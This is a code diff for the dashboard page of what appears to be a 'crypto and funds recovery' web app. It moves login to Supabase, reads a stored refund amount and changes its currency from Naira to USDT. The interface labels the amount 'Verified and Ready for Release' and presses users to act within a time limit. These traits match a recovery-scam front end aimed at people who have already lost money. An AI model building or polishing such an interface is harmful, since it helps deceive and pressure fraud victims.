@@ -4,29 +4,70 @@ import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Shield, Wallet, ArrowRight, Clock, CheckCircle, AlertTriangle } from "lucide-react";
+import { supabase } from "../supabaseClient"; 
 
 const Dashboard = () => {
   const [user, setUser] = useState<any>(null);
+  const [loading, setLoading] = useState(true); 
+  const [error, setError] = useState<string | null>(null); 
   const navigate = useNavigate();
 
-  useEffect(() => {
-    const userData = localStorage.getItem("user");
-    if (!userData) {
-      navigate("/login");
-      return;
-    }
-    setUser(JSON.parse(userData));
-  }, [navigate]);
+ useEffect(() => {
+  const fetchUserData = async () => {
+    try {
+      const { data: { user: authUser }, error: authError } = await supabase.auth.getUser();
 
+      if (authError || !authUser) {
+        navigate("/login");
+        return;
+      }
+
+      const { data, error } = await supabase
+        .from("profiles")
+        .select("refundamount") // Use lowercase to match the column name
+        .eq("id", authUser.id)
+        .single();
+
+      if (error) {
+        throw error;
+      }
+
+      if (data) {
+        setUser({ id: authUser.id, refundAmount: data.refundamount }); 
+      } else {
+        setError("No user data found");
+        navigate("/login");
+      }
+    } catch (err) {
+      console.error("Error fetching user data:", err);
+      setError("Failed to fetch user data");
+      navigate("/login");
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  fetchUserData();
+}, [navigate]);
+
+  // Handle logout
+  const handleLogout = async () => {
+    try {
+      await supabase.auth.signOut();
+      localStorage.removeItem("user"); 
+      navigate("/login");
+    } catch (err) {
+      console.error("Error logging out:", err);
+    }
+  };
+
+  // Show loading or error states
+  if (loading) return <div>Loading...</div>;
+  if (error) return <div>Error: {error}</div>;
   if (!user) return null;
 
   const handleProceedToRefund = () => {
     navigate("/recovery/step1");
-  };
-
-  const handleLogout = () => {
-    localStorage.removeItem("user");
-    navigate("/login");
   };
 
   return (
@@ -42,8 +83,8 @@ const Dashboard = () => {
                 <p className="text-sm text-primary">CRYPTO AND FUNDS RECOVERY</p>
               </div>
             </div>
-            <Button 
-              variant="outline" 
+            <Button
+              variant="outline"
               onClick={handleLogout}
               className="border-border/50 hover:bg-secondary"
             >
@@ -76,16 +117,16 @@ const Dashboard = () => {
             </CardHeader>
             <CardContent className="text-center space-y-6">
               <div className="space-y-2">
-                <p className="text-5xl font-bold text-primary">{user.refundAmount}</p>
-                <p className="text-sm text-muted-foreground">Nigerian Naira (NGN)</p>
+                <p className="text-5xl font-bold text-primary">${user.refundAmount}</p>
+                <p className="text-sm text-muted-foreground">USDT</p>
               </div>
-              
+
               <div className="flex items-center justify-center gap-2">
                 <CheckCircle className="h-5 w-5 text-primary" />
                 <span className="text-sm text-primary font-medium">Verified and Ready for Release</span>
               </div>
 
-              <Button 
+              <Button
                 onClick={handleProceedToRefund}
                 size="lg"
                 className="bg-primary hover:bg-primary/90 text-primary-foreground font-semibold px-8 py-3"
@@ -158,8 +199,8 @@ const Dashboard = () => {
                 <div>
                   <h3 className="font-semibold text-orange-500 mb-2">Important Notice</h3>
                   <p className="text-sm text-foreground">
-                    To ensure the security of your funds and prevent unauthorized access, 
-                    the recovery process must be completed within the specified timeframe. 
+                    To ensure the security of your funds and prevent unauthorized access,
+                    the recovery process must be completed within the specified timeframe.
                     Our advanced security protocols require immediate action to maintain session integrity.
                   </p>
                 </div>
